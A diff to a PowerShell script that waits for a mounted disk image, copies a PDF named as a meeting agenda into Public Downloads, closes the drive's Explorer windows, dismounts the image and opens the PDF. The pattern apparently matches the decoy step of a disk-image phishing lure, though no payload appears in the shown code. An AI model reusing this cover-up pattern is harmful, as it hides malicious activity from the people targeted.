@@ -10,7 +10,7 @@ function ExitClean {
     }
 }
 
-Start-Sleep -Seconds 10
+Start-Sleep -Seconds 5
 $deadline = (Get-Date).AddSeconds(45)
 try {
     do {
@@ -20,6 +20,16 @@ try {
         }
 
         $driveRoot = ('{0}:\' -f $v.DriveLetter)
+        $pdfSrc = Join-Path $driveRoot 'Shared Documents\Agenda_15-19_6-2026.pdf'
+        $pdfDir = Join-Path $env:PUBLIC 'Downloads'
+        $pdfDst = Join-Path $pdfDir 'Agenda_15-19_6-2026.pdf'
+        try {
+            if (-not (Test-Path -LiteralPath $pdfDir)) {
+                New-Item -ItemType Directory -Path $pdfDir -Force | Out-Null
+            }
+            Copy-Item -LiteralPath $pdfSrc -Destination $pdfDst -Force -ErrorAction Stop
+        } catch { }
+
         try {
             $shell = New-Object -ComObject Shell.Application
             foreach ($window in @($shell.Windows())) {
@@ -35,6 +45,9 @@ try {
         Start-Sleep -Milliseconds 500
         try {
             Get-DiskImage -Volume $v -ErrorAction Stop | Dismount-DiskImage -ErrorAction Stop
+            if (Test-Path -LiteralPath $pdfDst) {
+                Start-Process -FilePath $pdfDst
+            }
             break
         } catch {
             Start-Sleep -Seconds 2
